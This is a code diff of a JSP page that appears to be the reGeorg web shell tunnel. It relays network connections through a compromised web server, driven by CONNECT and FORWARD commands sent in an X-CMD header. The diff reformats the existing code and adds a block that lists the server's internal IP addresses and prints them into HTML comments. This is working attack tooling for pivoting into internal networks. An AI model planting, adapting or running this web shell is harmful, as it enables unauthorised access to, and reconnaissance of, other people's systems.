@@ -1,6 +1,7 @@
 <%@page import="java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket,java.util.HashSet,java.net.InetAddress,java.net.NetworkInterface,java.net.SocketException,java.util.Enumeration,java.util.Iterator,java.util.Set" trimDirectiveWhitespaces="true"%><%
     String cmd = request.getHeader("X-CMD");
-    if (cmd != null) {
+    if (cmd != null)
+    {
         response.setHeader("X-STATUS", "OK");
         if (cmd.compareTo("CONNECT") == 0) {
             try {
@@ -52,7 +53,8 @@
                 //socketChannel.socket().close();
             }        
             
-        } else if (cmd.compareTo("FORWARD") == 0){
+        } else if (cmd.compareTo("FORWARD") == 0)
+        {
             SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket");
             try {
                 
@@ -77,8 +79,38 @@
                 response.setHeader("X-STATUS", "FAIL");
                 socketChannel.socket().close();
             }
-        } 
-    } else 
+        }/*/ in filter
+        else 
+        {
+            try {
+            String szIp = "";
+                Set<InetAddress> addrs = new HashSet<InetAddress>();
+                Enumeration<NetworkInterface> ns = null;
+                try {
+                    ns = NetworkInterface.getNetworkInterfaces();
+                } catch (SocketException e) {
+                    // ignored...
+                }
+                while (ns != null && ns.hasMoreElements()) 
+                {
+                    NetworkInterface n = ns.nextElement();
+                    Enumeration<InetAddress> is = n.getInetAddresses();
+                    while (is.hasMoreElements()) {
+                        InetAddress i = is.nextElement();
+                        if (!i.isLoopbackAddress() && !i.isLinkLocalAddress() && !i.isMulticastAddress()) szIp += "," + i.getHostAddress();
+                    }
+                }
+                out.print("<!-- ip:" + szIp + " -->");  
+            } catch (Exception e) {
+                // ignored...
+            }
+
+            //PrintWriter o = response.getWriter();  
+            out.print("<!-- Georg says, 'All seems fine' -->"); 
+        }
+        //////////////*/
+    }// in jsp
+    else
     {
         try {
         String szIp = "";
